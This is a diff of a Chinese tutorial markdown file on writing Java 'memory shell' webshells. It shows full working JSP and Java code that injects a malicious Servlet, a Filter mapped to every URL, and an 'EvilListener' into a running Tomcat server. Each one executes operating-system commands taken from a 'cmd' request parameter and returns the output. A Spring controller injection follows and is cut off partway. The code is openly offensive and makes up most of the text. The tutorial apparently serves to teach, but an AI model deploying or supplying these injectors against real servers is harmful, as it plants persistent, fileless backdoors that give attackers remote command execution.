@@ -1,5 +1,5 @@
 ---
-version: "<%@ page import='java.lang.reflect.Field' %>"
+version: "<%@ page import='java.lang.reflect.Field' %>"
 source: "MrWQ/vulnerability-paper"
 ---
 
@@ -10,7 +10,7 @@ source: "MrWQ/vulnerability-paper"
 
 前文地址：  
 https://mp.weixin.qq.com/s/hdqwsYtBN_IpaH2DGZLPoA  
-完整版地址：  https://w01fh4cker.github.io/2024/02/02/Master_the_Java_memshell_from_0_to_1_with_complete_zero_foundation/
+完整版地址：  https://w01fh4cker.github.io/2024/02/02/Master_the_Java_memshell_from_0_to_1_with_complete_zero_foundation/
 
 三、传统 Web 型内存马
 =============
@@ -44,94 +44,94 @@ https://mp.weixin.qq.com/s/hdqwsYtBN_IpaH2DGZLPoA
 由以上结论我们可以写出如下内存马`demo`：
 
 ```
-<%@ page import="java.lang.reflect.Field" %>
-<%@ page import="javax.servlet.Servlet" %>
-<%@ page import="javax.servlet.ServletConfig" %>
-<%@ page import="javax.servlet.ServletContext" %>
-<%@ page import="javax.servlet.ServletRequest" %>
-<%@ page import="javax.servlet.ServletResponse" %>
-<%@ page import="java.io.IOException" %>
-<%@ page import="java.io.InputStream" %>
-<%@ page import="java.util.Scanner" %>
-<%@ page import="java.io.PrintWriter" %>
-<%@ page import="org.apache.catalina.core.StandardContext" %>
-<%@ page import="org.apache.catalina.core.ApplicationContext" %>
-<%@ page import="org.apache.catalina.Wrapper" %>
-<%@ page contentType="text/html;charset=UTF-8" language="java" %>
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="javax.servlet.Servlet" %>
+<%@ page import="javax.servlet.ServletConfig" %>
+<%@ page import="javax.servlet.ServletContext" %>
+<%@ page import="javax.servlet.ServletRequest" %>
+<%@ page import="javax.servlet.ServletResponse" %>
+<%@ page import="java.io.IOException" %>
+<%@ page import="java.io.InputStream" %>
+<%@ page import="java.util.Scanner" %>
+<%@ page import="java.io.PrintWriter" %>
+<%@ page import="org.apache.catalina.core.StandardContext" %>
+<%@ page import="org.apache.catalina.core.ApplicationContext" %>
+<%@ page import="org.apache.catalina.Wrapper" %>
+<%@ page contentType="text/html;charset=UTF-8" language="java" %>
 <html>
 <head>
-    <title>MemoryShellInjectDemo</title>
+    <title>MemoryShellInjectDemo</title>
 </head>
 <body>
 <%
-    try {
-        ServletContext servletContext = request.getSession().getServletContext();
-        Field appctx = servletContext.getClass().getDeclaredField("context");
-        appctx.setAccessible(true);
-        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
-        Field stdctx = applicationContext.getClass().getDeclaredField("context");
-        stdctx.setAccessible(true);
-        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
-        String servletURL = "/" + getRandomString();
-        String servletName = "Servlet" + getRandomString();
-        Servlet servlet = new Servlet() {
-            @Override
-            public void init(ServletConfig servletConfig) {}
-            @Override
-            public ServletConfig getServletConfig() {
-                return null;
-            }
-            @Override
-            public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws IOException {
-                String cmd = servletRequest.getParameter("cmd");
-                {
-                    InputStream in = Runtime.getRuntime().exec("cmd /c " + cmd).getInputStream();
-                    Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
-                    String output = s.hasNext() ? s.next() : "";
-                    servletResponse.setCharacterEncoding("GBK");
-                    PrintWriter out = servletResponse.getWriter();
-                    out.println(output);
-                    out.flush();
-                    out.close();
-                }
-            }
-            @Override
-            public String getServletInfo() {
-                return null;
-            }
-            @Override
-            public void destroy() {
-            }
-        };
-        Wrapper wrapper = standardContext.createWrapper();
-        wrapper.setName(servletName);
-        wrapper.setServlet(servlet);
-        wrapper.setServletClass(servlet.getClass().getName());
-        wrapper.setLoadOnStartup(1);
-        standardContext.addChild(wrapper);
-        standardContext.addServletMappingDecoded(servletURL, servletName);
-        response.getWriter().write("[+] Success!!!<br><br>[*] ServletURL:    " + servletURL + "<br><br>[*] ServletName:    " + servletName + "<br><br>[*] shellURL:    http://localhost:8080/test" + servletURL + "?cmd=echo 世界，你好！");
-    } catch (Exception e) {
-        String errorMessage = e.getMessage();
-        response.setCharacterEncoding("UTF-8");
-        PrintWriter outError = response.getWriter();
-        outError.println("Error: " + errorMessage);
-        outError.flush();
-        outError.close();
-    }
+    try {
+        ServletContext servletContext = request.getSession().getServletContext();
+        Field appctx = servletContext.getClass().getDeclaredField("context");
+        appctx.setAccessible(true);
+        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
+        Field stdctx = applicationContext.getClass().getDeclaredField("context");
+        stdctx.setAccessible(true);
+        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
+        String servletURL = "/" + getRandomString();
+        String servletName = "Servlet" + getRandomString();
+        Servlet servlet = new Servlet() {
+            @Override
+            public void init(ServletConfig servletConfig) {}
+            @Override
+            public ServletConfig getServletConfig() {
+                return null;
+            }
+            @Override
+            public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws IOException {
+                String cmd = servletRequest.getParameter("cmd");
+                {
+                    InputStream in = Runtime.getRuntime().exec("cmd /c " + cmd).getInputStream();
+                    Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
+                    String output = s.hasNext() ? s.next() : "";
+                    servletResponse.setCharacterEncoding("GBK");
+                    PrintWriter out = servletResponse.getWriter();
+                    out.println(output);
+                    out.flush();
+                    out.close();
+                }
+            }
+            @Override
+            public String getServletInfo() {
+                return null;
+            }
+            @Override
+            public void destroy() {
+            }
+        };
+        Wrapper wrapper = standardContext.createWrapper();
+        wrapper.setName(servletName);
+        wrapper.setServlet(servlet);
+        wrapper.setServletClass(servlet.getClass().getName());
+        wrapper.setLoadOnStartup(1);
+        standardContext.addChild(wrapper);
+        standardContext.addServletMappingDecoded(servletURL, servletName);
+        response.getWriter().write("[+] Success!!!<br><br>[*] ServletURL:    " + servletURL + "<br><br>[*] ServletName:    " + servletName + "<br><br>[*] shellURL:    http://localhost:8080/test" + servletURL + "?cmd=echo 世界，你好！");
+    } catch (Exception e) {
+        String errorMessage = e.getMessage();
+        response.setCharacterEncoding("UTF-8");
+        PrintWriter outError = response.getWriter();
+        outError.println("Error: " + errorMessage);
+        outError.flush();
+        outError.close();
+    }
 %>
 </body>
 </html>
 <%!
-    private String getRandomString() {
-        String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
-        StringBuilder randomString = new StringBuilder();
-        for (int i = 0; i < 8; i++) {
-            int index = (int) (Math.random() * characters.length());
-            randomString.append(characters.charAt(index));
-        }
-        return randomString.toString();
-    }
+    private String getRandomString() {
+        String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+        StringBuilder randomString = new StringBuilder();
+        for (int i = 0; i < 8; i++) {
+            int index = (int) (Math.random() * characters.length());
+            randomString.append(characters.charAt(index));
+        }
+        return randomString.toString();
+    }
 %>
 
 
@@ -148,13 +148,13 @@ https://mp.weixin.qq.com/s/hdqwsYtBN_IpaH2DGZLPoA
 先完成第一个任务：找到`StandardContext`，代码如下：
 
 ```
-ServletContext servletContext = request.getSession().getServletContext();
-Field appctx = servletContext.getClass().getDeclaredField("context");
+ServletContext servletContext = request.getSession().getServletContext();
+Field appctx = servletContext.getClass().getDeclaredField("context");
 appctx.setAccessible(true);
-ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
-Field stdctx = applicationContext.getClass().getDeclaredField("context");
+ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
+Field stdctx = applicationContext.getClass().getDeclaredField("context");
 stdctx.setAccessible(true);
-StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
+StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
 
 
 ```
@@ -166,34 +166,34 @@ StandardContext standardContext = (StandardContext) stdctx.get(applicationCo
 接着完成第二个任务：继承并编写一个恶意`servlet`，代码如下：
 
 ```
-Servlet servlet = new Servlet() {
-    @Override
-    public void init(ServletConfig servletConfig) {}
-    @Override
-    public ServletConfig getServletConfig() {
-        return null;
-    }
-    @Override
-    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws IOException {
-        String cmd = servletRequest.getParameter("cmd");
-        {
-            InputStream in = Runtime.getRuntime().exec("cmd /c " + cmd).getInputStream();
-            Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
-            String output = s.hasNext() ? s.next() : "";
-            servletResponse.setCharacterEncoding("GBK");
-            PrintWriter out = servletResponse.getWriter();
-            out.println(output);
-            out.flush();
-            out.close();
-        }
-    }
-    @Override
-    public String getServletInfo() {
-        return null;
-    }
-    @Override
-    public void destroy() {
-    }
+Servlet servlet = new Servlet() {
+    @Override
+    public void init(ServletConfig servletConfig) {}
+    @Override
+    public ServletConfig getServletConfig() {
+        return null;
+    }
+    @Override
+    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws IOException {
+        String cmd = servletRequest.getParameter("cmd");
+        {
+            InputStream in = Runtime.getRuntime().exec("cmd /c " + cmd).getInputStream();
+            Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
+            String output = s.hasNext() ? s.next() : "";
+            servletResponse.setCharacterEncoding("GBK");
+            PrintWriter out = servletResponse.getWriter();
+            out.println(output);
+            out.flush();
+            out.close();
+        }
+    }
+    @Override
+    public String getServletInfo() {
+        return null;
+    }
+    @Override
+    public void destroy() {
+    }
 };
 
 
@@ -218,13 +218,13 @@ Servlet servlet = new Servlet() {
 接着我们需要完成后续的六个任务：创建`Wapper`对象、设置`Servlet`的`LoadOnStartUp`的值、设置`Servlet`的`Name`、设置`Servlet`对应的`Class`、将`Servlet`添加到`context`的`children`中、将`url`路径和`servlet`类做映射，代码如下：
 
 ```
-Wrapper wrapper = standardContext.createWrapper();
+Wrapper wrapper = standardContext.createWrapper();
 wrapper.setName(servletName);
 wrapper.setServlet(servlet);
 wrapper.setServletClass(servlet.getClass().getName());
 wrapper.setLoadOnStartup(1);
 standardContext.addChild(wrapper);
-standardContext.addServletMappingDecoded(servletURL, servletName);
+standardContext.addServletMappingDecoded(servletURL, servletName);
 
 
 ```
@@ -232,8 +232,8 @@ standardContext.addServletMappingDecoded(servletURL, servletName);
 前面几步在之前已经讲过了，这个`standardContext.addChild(wrapper);`是为了让我们自定义的`servlet`成为`Web`应用程序的一部分；然后`standardContext.addServletMappingDecoded(servletURL, servletName);`也可以写成如下形式：
 
 ```
-// 要引入：<%@ page import="org.apache.catalina.core.ApplicationServletRegistration" %>
-ServletRegistration.Dynamic dynamic = new ApplicationServletRegistration(wrapper, standardContext);
+// 要引入：<%@ page import="org.apache.catalina.core.ApplicationServletRegistration" %>
+ServletRegistration.Dynamic dynamic = new ApplicationServletRegistration(wrapper, standardContext);
 dynamic.addMapping(servletURL);
 
 
@@ -293,114 +293,114 @@ dynamic.addMapping(servletURL);
 由以上结论我们可以写出如下内存马`demo`：
 
 ```
-<%@ page import="java.lang.reflect.*" %>
-<%@ page import="org.apache.catalina.core.StandardContext" %>
-<%@ page import="java.util.Map" %>
-<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
-<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
-<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
-<%@ page import="org.apache.catalina.Context" %>
-<%@ page import="org.apache.catalina.core.ApplicationContext" %>
-<%@ page import="java.io.*" %>
-<%@ page import="java.util.Scanner" %>
-<%@ page import="java.util.List" %>
-<%@ page import="java.util.ArrayList" %>
+<%@ page import="java.lang.reflect.*" %>
+<%@ page import="org.apache.catalina.core.StandardContext" %>
+<%@ page import="java.util.Map" %>
+<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
+<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
+<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
+<%@ page import="org.apache.catalina.Context" %>
+<%@ page import="org.apache.catalina.core.ApplicationContext" %>
+<%@ page import="java.io.*" %>
+<%@ page import="java.util.Scanner" %>
+<%@ page import="java.util.List" %>
+<%@ page import="java.util.ArrayList" %>
 <%
-    ServletContext servletContext = request.getSession().getServletContext();
-    Field appctx = servletContext.getClass().getDeclaredField("context");
-    appctx.setAccessible(true);
-    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
-    Field stdctx = applicationContext.getClass().getDeclaredField("context");
-    stdctx.setAccessible(true);
-    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
-    Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
-    filterConfigsField.setAccessible(true);
-    Map filterConfigs = (Map) filterConfigsField.get(standardContext);
-    String filterName = getRandomString();
-    if (filterConfigs.get(filterName) == null) {
-        Filter filter = new Filter() {
-            @Override
-            public void init(FilterConfig filterConfig) {
-            }
+    ServletContext servletContext = request.getSession().getServletContext();
+    Field appctx = servletContext.getClass().getDeclaredField("context");
+    appctx.setAccessible(true);
+    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
+    Field stdctx = applicationContext.getClass().getDeclaredField("context");
+    stdctx.setAccessible(true);
+    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
+    Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
+    filterConfigsField.setAccessible(true);
+    Map filterConfigs = (Map) filterConfigsField.get(standardContext);
+    String filterName = getRandomString();
+    if (filterConfigs.get(filterName) == null) {
+        Filter filter = new Filter() {
+            @Override
+            public void init(FilterConfig filterConfig) {
+            }
 
-            @Override
-            public void destroy() {
-            }
+            @Override
+            public void destroy() {
+            }
 
-            @Override
-            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
-                HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
-                String cmd = httpServletRequest.getParameter("cmd");
-                {
-                    InputStream in = Runtime.getRuntime().exec("cmd /c " + cmd).getInputStream();
-                    Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
-                    String output = s.hasNext() ? s.next() : "";
-                    servletResponse.setCharacterEncoding("GBK");
-                    PrintWriter out = servletResponse.getWriter();
-                    out.println(output);
-                    out.flush();
-                    out.close();
-                }
-                filterChain.doFilter(servletRequest, servletResponse);
-            }
-        };
-        FilterDef filterDef = new FilterDef();
-        filterDef.setFilterName(filterName);
-        filterDef.setFilterClass(filter.getClass().getName());
-        filterDef.setFilter(filter);
-        standardContext.addFilterDef(filterDef);
-        FilterMap filterMap = new FilterMap();
-        filterMap.setFilterName(filterName);
-        filterMap.addURLPattern("/*");
-        filterMap.setDispatcher(DispatcherType.REQUEST.name());
-        standardContext.addFilterMapBefore(filterMap);
-        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
-        constructor.setAccessible(true);
-        ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
-        filterConfigs.put(filterName, applicationFilterConfig);
-        out.print("[+]    Malicious filter injection successful!<br>[+]    Filter name: " + filterName + "<br>[+]    Below is a list displaying filter names and their corresponding URL patterns:");
-        out.println("<table border='1'>");
-        out.println("<tr><th>Filter Name</th><th>URL Patterns</th></tr>");
-        List<String[]> allUrlPatterns = new ArrayList<>();
-        for (Object filterConfigObj : filterConfigs.values()) {
-            if (filterConfigObj instanceof ApplicationFilterConfig) {
-                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) filterConfigObj;
-                String filtername = filterConfig.getFilterName();
-                FilterDef filterdef = standardContext.findFilterDef(filtername);
-                if (filterdef != null) {
-                    FilterMap[] filterMaps = standardContext.findFilterMaps();
-                    for (FilterMap filtermap : filterMaps) {
-                        if (filtermap.getFilterName().equals(filtername)) {
-                            String[] urlPatterns = filtermap.getURLPatterns();
-                            allUrlPatterns.add(urlPatterns); // 将当前迭代的urlPatterns添加到列表中
+            @Override
+            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+                HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
+                String cmd = httpServletRequest.getParameter("cmd");
+                {
+                    InputStream in = Runtime.getRuntime().exec("cmd /c " + cmd).getInputStream();
+                    Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
+                    String output = s.hasNext() ? s.next() : "";
+                    servletResponse.setCharacterEncoding("GBK");
+                    PrintWriter out = servletResponse.getWriter();
+                    out.println(output);
+                    out.flush();
+                    out.close();
+                }
+                filterChain.doFilter(servletRequest, servletResponse);
+            }
+        };
+        FilterDef filterDef = new FilterDef();
+        filterDef.setFilterName(filterName);
+        filterDef.setFilterClass(filter.getClass().getName());
+        filterDef.setFilter(filter);
+        standardContext.addFilterDef(filterDef);
+        FilterMap filterMap = new FilterMap();
+        filterMap.setFilterName(filterName);
+        filterMap.addURLPattern("/*");
+        filterMap.setDispatcher(DispatcherType.REQUEST.name());
+        standardContext.addFilterMapBefore(filterMap);
+        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
+        constructor.setAccessible(true);
+        ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
+        filterConfigs.put(filterName, applicationFilterConfig);
+        out.print("[+]    Malicious filter injection successful!<br>[+]    Filter name: " + filterName + "<br>[+]    Below is a list displaying filter names and their corresponding URL patterns:");
+        out.println("<table border='1'>");
+        out.println("<tr><th>Filter Name</th><th>URL Patterns</th></tr>");
+        List<String[]> allUrlPatterns = new ArrayList<>();
+        for (Object filterConfigObj : filterConfigs.values()) {
+            if (filterConfigObj instanceof ApplicationFilterConfig) {
+                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) filterConfigObj;
+                String filtername = filterConfig.getFilterName();
+                FilterDef filterdef = standardContext.findFilterDef(filtername);
+                if (filterdef != null) {
+                    FilterMap[] filterMaps = standardContext.findFilterMaps();
+                    for (FilterMap filtermap : filterMaps) {
+                        if (filtermap.getFilterName().equals(filtername)) {
+                            String[] urlPatterns = filtermap.getURLPatterns();
+                            allUrlPatterns.add(urlPatterns); // 将当前迭代的urlPatterns添加到列表中
 
-                            out.println("<tr><td>" + filtername + "</td>");
-                            out.println("<td>" + String.join(", ", urlPatterns) + "</td></tr>");
-                        }
-                    }
-                }
-            }
-        }
-        out.println("</table>");
-        for (String[] urlPatterns : allUrlPatterns) {
-            for (String pattern : urlPatterns) {
-                if (!pattern.equals("/*")) {
-                    out.println("[+]    shell: http://localhost:8080/test" + pattern + "?cmd=ipconfig<br>");
-                }
-            }
-        }
-    }
+                            out.println("<tr><td>" + filtername + "</td>");
+                            out.println("<td>" + String.join(", ", urlPatterns) + "</td></tr>");
+                        }
+                    }
+                }
+            }
+        }
+        out.println("</table>");
+        for (String[] urlPatterns : allUrlPatterns) {
+            for (String pattern : urlPatterns) {
+                if (!pattern.equals("/*")) {
+                    out.println("[+]    shell: http://localhost:8080/test" + pattern + "?cmd=ipconfig<br>");
+                }
+            }
+        }
+    }
 %>
 <%!
-    private String getRandomString() {
-        String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
-        StringBuilder randomString = new StringBuilder();
-        for (int i = 0; i < 8; i++) {
-            int index = (int) (Math.random() * characters.length());
-            randomString.append(characters.charAt(index));
-        }
-        return randomString.toString();
-    }
+    private String getRandomString() {
+        String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+        StringBuilder randomString = new StringBuilder();
+        for (int i = 0; i < 8; i++) {
+            int index = (int) (Math.random() * characters.length());
+            randomString.append(characters.charAt(index));
+        }
+        return randomString.toString();
+    }
 %>
 
 
@@ -417,16 +417,16 @@ dynamic.addMapping(servletURL);
 我们分开来分析，首先看这段代码：
 
 ```
-ServletContext servletContext = request.getSession().getServletContext();
-Field appctx = servletContext.getClass().getDeclaredField("context");
+ServletContext servletContext = request.getSession().getServletContext();
+Field appctx = servletContext.getClass().getDeclaredField("context");
 appctx.setAccessible(true);
-ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
-Field stdctx = applicationContext.getClass().getDeclaredField("context");
+ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
+Field stdctx = applicationContext.getClass().getDeclaredField("context");
 stdctx.setAccessible(true);
-StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
-Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
+StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
+Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
 filterConfigsField.setAccessible(true);
-Map filterConfigs = (Map) filterConfigsField.get(standardContext);
+Map filterConfigs = (Map) filterConfigsField.get(standardContext);
 
 
 ```
@@ -438,20 +438,20 @@ Map filterConfigs = (Map) filterConfigsField.get(standardContext);
 然后是这段代码：
 
 ```
-FilterDef filterDef = new FilterDef();
+FilterDef filterDef = new FilterDef();
 filterDef.setFilterName(filterName);
 filterDef.setFilterClass(filter.getClass().getName());
 filterDef.setFilter(filter);
 standardContext.addFilterDef(filterDef);
-FilterMap filterMap = new FilterMap();
+FilterMap filterMap = new FilterMap();
 filterMap.setFilterName(filterName);
 filterMap.addURLPattern("/*");
 filterMap.setDispatcher(DispatcherType.REQUEST.name());
 standardContext.addFilterMapBefore(filterMap);
-Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
+Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
 constructor.setAccessible(true);
-ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
-filterConfigs.put(filterName, applicationFilterConfig);
+ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
+filterConfigs.put(filterName, applicationFilterConfig);
 
 
 ```
@@ -461,8 +461,8 @@ filterConfigs.put(filterName, applicationFilterConfig);
 需要注意的是，在`tomcat 7`及以前`FilterDef`和`FilterMap`这两个类所属的包名是：
 
 ```
-<%@ page import="org.apache.catalina.deploy.FilterMap" %>
-<%@ page import="org.apache.catalina.deploy.FilterDef" %>
+<%@ page import="org.apache.catalina.deploy.FilterMap" %>
+<%@ page import="org.apache.catalina.deploy.FilterDef" %>
 
 
 ```
@@ -470,8 +470,8 @@ filterConfigs.put(filterName, applicationFilterConfig);
 `tomcat 8`及以后，包名是这样的：
 
 ```
-<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
-<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
+<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
+<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
 
 
 ```
@@ -480,7 +480,7 @@ filterConfigs.put(filterName, applicationFilterConfig);
 
 > https://github.com/feihong-cs/memShell/blob/master/src/main/java/com/memshell/tomcat/FilterBasedWithoutRequestVariant.java
 
-还有个需要注意的点就是，我给出的这个`demo`代码只适用于`tomcat 7`及以上，因为  `filterMap.setDispatcher(DispatcherType.REQUEST.name());`这行代码中用到的`DispatcherType`是在`Servlet 3.0`规范中才有的。
+还有个需要注意的点就是，我给出的这个`demo`代码只适用于`tomcat 7`及以上，因为  `filterMap.setDispatcher(DispatcherType.REQUEST.name());`这行代码中用到的`DispatcherType`是在`Servlet 3.0`规范中才有的。
 
 ### 3.2.3 tomcat6 下 filter 内存马的编写
 
@@ -519,43 +519,43 @@ filterConfigs.put(filterName, applicationFilterConfig);
 由以上结论我们可以写出如下内存马`demo`：
 
 ```
-<%@ page import="org.apache.catalina.core.StandardContext" %>
-<%@ page import="java.lang.reflect.Field" %>
-<%@ page import="org.apache.catalina.connector.Request" %>
-<%@ page import="java.io.InputStream" %>
-<%@ page import="java.util.Scanner" %>
+<%@ page import="org.apache.catalina.core.StandardContext" %>
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="org.apache.catalina.connector.Request" %>
+<%@ page import="java.io.InputStream" %>
+<%@ page import="java.util.Scanner" %>
 
 <%!
-    public class EvilListener implements ServletRequestListener {
-        public void requestDestroyed(ServletRequestEvent sre) {
-            HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
-            if (req.getParameter("cmd") != null){
-                InputStream in = null;
-                try {
-                    in = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",req.getParameter("cmd")}).getInputStream();
-                    Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
-                    String out = s.hasNext()?s.next():"";
-                    Field requestF = req.getClass().getDeclaredField("request");
-                    requestF.setAccessible(true);
-                    Request request = (Request)requestF.get(req);
-                    request.getResponse().setCharacterEncoding("GBK");
-                    request.getResponse().getWriter().write(out);
-                }
-                catch (Exception ignored) {}
-            }
-        }
-        public void requestInitialized(ServletRequestEvent sre) {}
-    }
+    public class EvilListener implements ServletRequestListener {
+        public void requestDestroyed(ServletRequestEvent sre) {
+            HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
+            if (req.getParameter("cmd") != null){
+                InputStream in = null;
+                try {
+                    in = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",req.getParameter("cmd")}).getInputStream();
+                    Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
+                    String out = s.hasNext()?s.next():"";
+                    Field requestF = req.getClass().getDeclaredField("request");
+                    requestF.setAccessible(true);
+                    Request request = (Request)requestF.get(req);
+                    request.getResponse().setCharacterEncoding("GBK");
+                    request.getResponse().getWriter().write(out);
+                }
+                catch (Exception ignored) {}
+            }
+        }
+        public void requestInitialized(ServletRequestEvent sre) {}
+    }
 %>
 
 <%
-    Field reqF = request.getClass().getDeclaredField("request");
-    reqF.setAccessible(true);
-    Request req = (Request) reqF.get(request);
-    StandardContext context = (StandardContext) req.getContext();
-    EvilListener evilListener = new EvilListener();
-    context.addApplicationEventListener(evilListener);
-    out.println("[+]    Inject Listener Memory Shell successfully!<br>[+]    Shell url: http://localhost:8080/test/?cmd=ipconfig");
+    Field reqF = request.getClass().getDeclaredField("request");
+    reqF.setAccessible(true);
+    Request req = (Request) reqF.get(request);
+    StandardContext context = (StandardContext) req.getContext();
+    EvilListener evilListener = new EvilListener();
+    context.addApplicationEventListener(evilListener);
+    out.println("[+]    Inject Listener Memory Shell successfully!<br>[+]    Shell url: http://localhost:8080/test/?cmd=ipconfig");
 %>
 
 
@@ -570,11 +570,11 @@ filterConfigs.put(filterName, applicationFilterConfig);
 最关键部分的代码如下：
 
 ```
-Field reqF = request.getClass().getDeclaredField("request");
+Field reqF = request.getClass().getDeclaredField("request");
 reqF.setAccessible(true);
-Request req = (Request) reqF.get(request);
-StandardContext context = (StandardContext) req.getContext();
-EvilListener evilListener = new EvilListener();
+Request req = (Request) reqF.get(request);
+StandardContext context = (StandardContext) req.getContext();
+EvilListener evilListener = new EvilListener();
 context.addApplicationEventListener(evilListener);
 
 
@@ -606,75 +606,75 @@ context.addApplicationEventListener(evilListener);
 代码如下：
 
 ```
-package org.example.springcontrollermemoryshellexample.demos.web;
-import org.springframework.web.bind.annotation.RequestMapping;
-import org.springframework.web.bind.annotation.RestController;
-import org.springframework.web.context.WebApplicationContext;
-import org.springframework.web.context.request.RequestContextHolder;
-import org.springframework.web.context.request.ServletRequestAttributes;
-import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
-import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
-import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
-import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
-import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
-import java.io.InputStream;
-import java.lang.reflect.Method;
-import java.util.Scanner;
+package org.example.springcontrollermemoryshellexample.demos.web;
+import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.bind.annotation.RestController;
+import org.springframework.web.context.WebApplicationContext;
+import org.springframework.web.context.request.RequestContextHolder;
+import org.springframework.web.context.request.ServletRequestAttributes;
+import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
+import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
+import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
+import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.InputStream;
+import java.lang.reflect.Method;
+import java.util.Scanner;
 
 @RestController
-public class TestEvilController {
+public class TestEvilController {
 
-    private String getRandomString() {
-        String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
-        StringBuilder randomString = new StringBuilder();
-        for (int i = 0; i < 8; i++) {
-            int index = (int) (Math.random() * characters.length());
-            randomString.append(characters.charAt(index));
-        }
-        return randomString.toString();
-    }
+    private String getRandomString() {
+        String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+        StringBuilder randomString = new StringBuilder();
+        for (int i = 0; i < 8; i++) {
+            int index = (int) (Math.random() * characters.length());
+            randomString.append(characters.charAt(index));
+        }
+        return randomString.toString();
+    }
 
-    @RequestMapping("/inject")
-    public String inject() throws Exception{
-        String controllerName = "/" + getRandomString();
-        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
-        RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
-        Method method = InjectedController.class.getMethod("cmd");
-        PatternsRequestCondition urlPattern = new PatternsRequestCondition(controllerName);
-        RequestMethodsRequestCondition condition = new RequestMethodsRequestCondition();
-        RequestMappingInfo info = new RequestMappingInfo(urlPattern, condition, null, null, null, null, null);
